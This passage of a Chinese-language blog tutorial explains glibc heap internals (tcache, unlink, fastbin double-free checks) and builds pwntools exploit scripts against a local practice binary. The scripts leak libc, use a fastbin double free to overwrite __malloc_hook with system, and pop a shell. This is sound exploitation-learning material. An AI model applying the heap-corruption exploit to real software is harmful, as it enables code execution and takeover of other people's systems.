<li>singly link list，每一個 tcache 的 fd 都會指向下一個 tache 的 user data 的位址<br><img src="/img/2019/heap_exploitation/heap_tcache_tcache_entry.png" alt=""></li>
<li>tcache 不透過 <code>_int_malloc</code> 與 <code>_int_free</code> 獲取和釋放 chunk，他有自己的 <code>tcache_get</code> 和 <code>tcache_put</code> 來取代這兩個 function<br><img src="/img/2019/heap_exploitation/heap_tcache_tcache_get_put.png" alt=""></li>
<li>與 fastbin一樣針對 chunk size 分為許多段<ul>
<li>[0x20,0x30…..0x410] (0x410 is chunk size, 0x408 without chunk header)</li>
<li>TCACHE_MAX_BINS = (0x410-0x20)/0x10+1=64 (包含0x20本身所以+1)<br><img src="/img/2019/heap_exploitation/heap_tcache_TCACHE_MAX_BINS.png" alt=""></li>
<li>每個 tcache 段最多收 7 個 chunk<br><img src="/img/2019/heap_exploitation/heap_tcache_TCACHE_FILL_COUNT.png" alt=""></li>
<li>tcache_max_size = <code>(64-1) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ</code> = 0x408<ul>
<li>MINSIZE = <code>(MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK</code> = 0x20</li>
<li>MIN_CHUNK_SIZE = <code>offsetof(struct malloc_chunk, fd_nextsize)</code> = 0x20</li>
<li>MALLOC_ALIGNMENT = 0x10 </li>
<li>MALLOC_ALIGN_MASK = 0xf</li>
<li>SIZE_SZ = 0x8</li>
<li>相關補充資料<ul>
<li>offsetof<ul>
<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/Offsetof">https://zh.wikipedia.org/zh-tw/Offsetof</a></li>
</ul>
</li>
<li>malloc_chunk structure<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">	INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">	INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">	struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">	struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">	/* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">	struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">	struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>LIFO</li>
<li>free 這類的 chunk 不會取消鄰近 chunk 的 inuse bit</li>
<li>在 free 時如果下一塊是 top chunk 則不會被合併進去</li>
<li>跟fastbin一樣沒有 bk，但不同的是 fd 指向的是下一個 chunk 的 <code>user data</code> 位置，不是 chunk header 的位置</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/img/2019/heap_exploitation/heap_tcache_chunk.png" alt=""></p>
<p>整個 malloc 的流程大概是這樣 (glibc 2.25 before)</p>
<p><img src="/img/2019/heap_exploitation/malloc_workflow.png" alt=""></p>
<ul>
<li><p>unlink<br>先給一張圖<br><img src="/img/2019/heap_exploitation/heap_unlink_before.png" alt=""><br>簡單來說，在從 bins 取出 chunk 的時候，libc 會檢查<br><code>prev_chunk=current_chunk-&gt;bk ; prev_chunk -&gt; fd=current_chunk</code><br><code>next_chunk=current_chunk-&gt;fd ; next_chunk -&gt; bk=current_chunk</code><br>假設上面兩個條件都達成時就進行 unlink<br><code>next_chunk-&gt;bk = prev_chunk</code><br><code>prev_chunk-&gt;fd = next_chunk</code><br><img src="/img/2019/heap_exploitation/heap_unlink_after.png" alt=""><br><img src="/img/2019/heap_exploitation/heap_unlink.png" alt=""></p>
</li>
<li><p>merge<br>為了避免記憶體破碎的問題，libc 會在特定情境下將 chunk merge<br>如果連續記憶體的下一塊是 (Fastbin chunk 算 inuse_chunk)</p>
<ul>
<li>top chunk<ul>
<li>prev_chunk == inuse ? (merge in top chunk) : (merge prev_chunk; merge in top chunk)</li>
</ul>
</li>
<li>free chunk<ul>
<li>prev_chunk == inuse ? (merge next_chunk and put in unsortbin) : (merge prev_chunk; merge next_chunk and put in unsortbin)</li>
</ul>
</li>
<li>inuse_chunk<ul>
<li>什麼都不做將當下的 free chunk 直接加入 unsortbin</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h1 id="Fastbin-double-free"><a href="#Fastbin-double-free" class="headerlink" title="Fastbin double free"></a>Fastbin double free</h1><hr>
<p>帶一下 fastbin 的攻擊手法</p>
<p>fastbin attack 比較常見的就是 <code>use after free</code> 與 <code>double free</code>，基本上脫離不了這幾個</p>
<p>首先看下面的 source code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">  void *chunk1,*chunk2,*chunk3;</span><br><span class="line">  chunk1=malloc(0x10);</span><br><span class="line">  chunk2=malloc(0x10);</span><br><span class="line"></span><br><span class="line">  free(chunk1);</span><br><span class="line">  free(chunk1);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>會收到下面的訊息:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** Error in `./1&#x27;: double free or corruption (fasttop): 0x0000000001864010 ***</span><br><span class="line">        Aborted (core dumped)</span><br></pre></td></tr></table></figure></p>
<p>如果是 glibc 2.25以上的則是收到這個<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(): double free detected in tcache 2</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure></p>
<p>這個是 libc 內 double free detected </p>
<p>但他只會檢查第一個 chunk 是否被 free 過而已<br>仔細讀一下檢測的 source code<br><img src="/img/2019/heap_exploitation/heap_double_free_detect.png" alt=""> </p>
<p><code>4219</code> 行是取得對應空間的 <code>fastbinsY</code> 陣列位置(ex. 0x40大小所對應的 fastbinsY 陣列是 2，則 idx=2)<br><code>#define fastbin_index(sz) ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</code></p>
<p><code>4220</code> 行是取得對應 <code>fastbinsY</code> 陣列的 <code>第一個 chunk</code> 的位置 (dereference)<br><code>#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</code><br><code>ar_ptr</code> 在 <code>malloc/arena.c</code> 找到，他是指向 main_arena 的內容，這邊意思大概 main_arena 指向的 fastbinsY[idx] (也就是 fastbinsY[idx] 指向的第一個 chunk)<br><img src="/img/2019/heap_exploitation/heap_malloc_state.png" alt=""></p>
<p><code>4223</code> 行我看不太懂，所以直接看註解，簡單來說 old 等於 fastbinsY[idx] 指向的的第一個 chunk，<code>p</code> 是即將要 free 的 chunk<br>假設即將要 free 的 chunk 等於 old，那就形成 <code>double free</code>，就會噴錯誤並退出</p>
<p><code>4229</code> 行就是在判斷我們要 free 的 chunk 是否等於 old，可以想成 <code>if(p==old)</code><br><code>__builtin_expect</code> 這個是告訴 compiler 預期解是多少，方便讓 CPU 先讀取預期的結果指令，算是一個優化指令<br>以這行來說就是我預期 <code>old</code> 與 <code>p</code> 並不相等，因為以一支正常的程式來說不會有 double free 的情況發生，所以預期是 False<br><code>4231</code> 跟 <code>4232</code> 行就是把 即將要 free 的 chunk 加入 fastbinsY[idx] 的鏈表內<br><code>4231</code> 行是把 <code>p</code> 的 fd 指向原本 fastbinsY[idx] 指向的第一個 chunk (現在 free 完變成第二個了)<br><code>4232</code> 行是把 fastbinsY[idx] 指向的第一個 chunk 複寫成 <code>p</code> 的 chunk header 位置</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c">https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c</a></p>
<p>因為他只會檢查第一個 chunk，所以攻擊的利用就是</p>
<ol>
<li>先 malloc 三個 fastbin chunk</li>
<li>先 free chunk1</li>
<li>再 free chunk2</li>
<li>再 free chunk1，因為現在 chunk2 是最上層的 chunk，所以只會檢查到 chunk2，可以順利 double free chunk1</li>
<li>整個 fastbin 的鏈表就會變成 chunk1 -&gt; chunk2 -&gt; chunk1 -&gt; chunk2 …</li>
<li>free chunk3</li>
<li>malloc fastbin chunk4，透過 print chunk4 取得 chunk1 的 address(因為 chunk3 的 fd 的位置是在 user_data 區段)</li>
<li>同樣方法先 malloc unsortbin 區段的 chunk5</li>
<li>free chunk5 再 malloc chunk6 取得 main_arena 的 libc 位置</li>
<li>透過第 9 步取得 <code>system</code> 和 <code>malloc_hook</code> 的 libc address</li>
<li>再連續 malloc 三塊 fastbin chunk 取得 chunk3 chunk1 chunk2 的資訊 (在 5. 6. 步驟中形成的)</li>
<li>把 chunk1 的 fd 改成 <code>malloc_hook-0x10</code> 的 libc 位置 </li>
</ol>
<p>我們先用 source code 做一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">        void *chunk1,*chunk2,*chunk3;</span><br><span class="line">        chunk1=malloc(0x10);</span><br><span class="line">        chunk2=malloc(0x10);</span><br><span class="line"></span><br><span class="line">        free(chunk1);</span><br><span class="line">        getchar(&#x27;1&#x27;);</span><br><span class="line">        free(chunk2);</span><br><span class="line">        getchar(&#x27;2&#x27;);</span><br><span class="line">        free(chunk1);</span><br><span class="line">        getchar(&#x27;3&#x27;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先 free chunk1<br><img src="/img/2019/heap_exploitation/heap_fastbin_double_free_1.png" alt=""><br>free chunk2<br><img src="/img/2019/heap_exploitation/heap_fastbin_double_free_2.png" alt=""><br>再次 free chunk1<br><img src="/img/2019/heap_exploitation/heap_fastbin_double_free_3.png" alt=""></p>
<p>以圖來說是這樣<br><img src="/img/2019/heap_exploitation/heap_fastbin_double_free_4.png" alt=""></p>
<p><a target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/heap/fastbin_attack/">https://ciphersaw.me/ctf-wiki/pwn/linux/heap/fastbin_attack/</a></p>
<p>成功規避了 double free 的偵測，這時候只要 free chunk3 再 malloc 跟 chunk3 一樣大小的 chunk4<br>透過 print chunk4 的資訊就可以取得 chunk1 的 address (因為 fd 是寫在 user data 區段)<br>可以利用同樣的方法先 malloc 一個 unsortbin 大小的 chunk 再 free 再 malloc<br>藉此取得 main_arena 的 libc 位置，這樣就可以取得 <code>system</code> 和 <code>malloc_hook</code> 的位置了<br>將 chunk1 的 fd 位置 (原本是 <code>malloc_hook</code>) 改寫成 <code>system</code><br>在 chunk2 的 fd 寫成 <code>/bin/sh</code>，最後 malloc(chunk2_fd_address) 就會變成 <code>system(&quot;/bin/sh&quot;)</code><br>chunk2 的位置可以藉由 chunk1 換算出來，因為他們 chunk size 是user 自訂的，位置也是連續的</p>
<hr>
<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><hr>
<h2 id="fastbin-dup-glibc-2-25-before-x64"><a href="#fastbin-dup-glibc-2-25-before-x64" class="headerlink" title="fastbin dup (glibc 2.25 before, x64)"></a>fastbin dup (glibc 2.25 before, x64)</h2><p>思路是這樣<br>我先 malloc 四個 chunk<br>一個 unsortbin 大小，三個 fastbin 大小<br>當我 free unsortbin 大小的 chunk 再 malloc 同樣大小時，就會拿到同樣 address 的 chunk<br>這時候再 get chunk content 就可以拿到殘留在裡面的 <code>main_arena</code> address<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(content))</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440) # chunk0</span><br><span class="line">create_note(0x30)  # chunk1</span><br><span class="line">create_note(0x30)  # chunk2</span><br><span class="line">del_note(0)</span><br><span class="line">create_note(0x440) #chunk3</span><br><span class="line">get_note(3)</span><br><span class="line">raw = io.recvuntil(&quot;# &quot;, drop=True)</span><br><span class="line">main_arena = u64(raw[11:17].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;main_arena address is &quot; + hex(main_arena))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_1.png" alt=""><br>這個 main_arena 的位置實際 gdb 進去看的結果其實是 main_arena+88 的位置，畢竟 main_arena 除了放 unsortbin 的東西以外還有 top chunk 之類的東西，多少還是有偏移，這邊的 88 也不一定是固定的，建議還是實際 trace 進去看一次才準<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_3.png" alt=""><br>透過 main_arena 的 offset 取得 libc base address<br>但 main_arena 比較特殊，用 pwntool好像德不出來 QQ<br>所以參考了網站<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/37960788/why-there-isnt-main-arena-in-libc-so-symbol-table-while-there-is-one-in-malloc">https://stackoverflow.com/questions/37960788/why-there-isnt-main-arena-in-libc-so-symbol-table-while-there-is-one-in-malloc</a></p>
<p><code>readelf -s /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.19.so|grep main_arena</code> 用這個 command 取得<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_2.png" alt=""><br>記得要先 <code>sudo apt install libc6-dbg</code> 才找的到 debug 版的 libc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.19.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(content))</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x30) # chunk1</span><br><span class="line">create_note(0x30) # chunk2</span><br><span class="line">create_note(0x30) # chunk3</span><br><span class="line">del_note(0)</span><br><span class="line">create_note(0x440)#chunk4</span><br><span class="line">get_note(4)</span><br><span class="line">raw = io.recvline()</span><br><span class="line">main_arena = u64(raw[11:17].ljust(8, b&#x27;\x00&#x27;))-88</span><br><span class="line"></span><br><span class="line">main_arena_libc_offset = 0x00000000003c2760</span><br><span class="line">libc_base = main_arena - main_arena_libc_offset</span><br><span class="line">log.info(&quot;main_arena address is &quot; + hex(main_arena))</span><br><span class="line">log.info(&quot;libc base address is &quot; + hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"></span><br><span class="line"># fastbin dup</span><br><span class="line">del_note(1)</span><br><span class="line">del_note(2)</span><br><span class="line">del_note(1)</span><br><span class="line">create_note(0x30) # chunk5</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2019/heap_exploitation/heap_fastbin_dup_4.png" alt=""><br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_5.png" alt=""><br>至此我們求出 libc_base address 了，還順便做了 fastbin_dup 取得 heap 的位置<br>用跟 main_arena address 的方法一樣透過 free chunk3 取得 chunk1 的位置<br>再透過改寫 chunk1 的 fd 改寫成 <code>malloc_hook</code>，為什麼是 malloc_hook 呢?<br>因為 malloc 會去 call <code>__libc_malloc</code>，而根據 <code>__libc_malloc</code> 的 source code 來看<br><img src="/img/2019/heap_exploitation/heap_libc_malloc.png" alt=""><br>他會去檢查 <code>malloc_hook</code> 裡面有沒有值，如果不為 NULL 就會調用 malloc_hook 指向的位址<br><img src="/img/2019/heap_exploitation/heap_libc_malloc_hook.png" alt=""><br>後面我們會改寫 <code>malloc_hook</code> 的內容以達到攻擊<br>source: <a target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a><br>接著把 chunk2, chunk1, 和 <code>malloc_hook address</code> 再 malloc 出來<br>(因為我們上面把 chunk1 的 fd 改成 <code>malloc_hook</code> 了，然後記住 chunk1 和 chunk2 是既被 free 又被 malloc 的狀態)<br>再把  <code>malloc_hook address</code>  改寫成 <code>system</code><br>chunk1 的內容改寫成 <code>&quot;/bin/sh&quot;</code> ，接下來我們只要把 malloc 當 system 來使用<br><code>malloc(chunk1_address+0x10)</code> 就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.19.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk2</span><br><span class="line">create_note(0x60) # chunk3</span><br><span class="line">del_note(0) # free chunk0</span><br><span class="line">create_note(0x440) #chunk4</span><br><span class="line">get_note(4)</span><br><span class="line">raw = io.recvline()</span><br><span class="line">main_arena = u64(raw[11:17].ljust(8, b&#x27;\x00&#x27;))-88</span><br><span class="line"></span><br><span class="line">main_arena_libc_offset = 0x00000000003c2760</span><br><span class="line">libc_base = main_arena - main_arena_libc_offset</span><br><span class="line">log.info(&quot;main_arena address is &quot; + hex(main_arena))</span><br><span class="line">log.info(&quot;libc base address is &quot; + hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">log.info(&quot;malloc_hook address is &quot; + hex(malloc_hook))</span><br><span class="line">malloc_hook_s13 = malloc_hook - 0x13</span><br><span class="line">log.info(&quot;malloc_hook_s13 is &quot; + hex(malloc_hook_s13))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># fastbin dup</span><br><span class="line">del_note(1)</span><br><span class="line">del_note(2)</span><br><span class="line">del_note(1)</span><br><span class="line">del_note(3)</span><br><span class="line">create_note(0x60) # chunk5</span><br><span class="line">get_note(5)</span><br><span class="line"># leak heap</span><br><span class="line">raw = io.recvline()[11:-1]</span><br><span class="line">chunk1_heap_address = u64(raw.ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">log.info(hex(chunk1_heap_address))</span><br><span class="line">create_note(0x60) # chunk6 chunk1 address</span><br><span class="line">set_note(&quot;6&quot;, p64(malloc_hook_s13))</span><br><span class="line">create_note(0x60) # chunk7, chunk2 address</span><br><span class="line">create_note(0x60) # chunk8, chunk1 address</span><br><span class="line">create_note(0x60) # chunk9, malloc_hook_s13 address</span><br><span class="line"></span><br><span class="line">set_note(8, &#x27;/bin/sh\x00&#x27;)</span><br><span class="line">set_note(9, &quot;a&quot;*0x3+p64(system))</span><br><span class="line">create_note(chunk1_heap_address + 0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
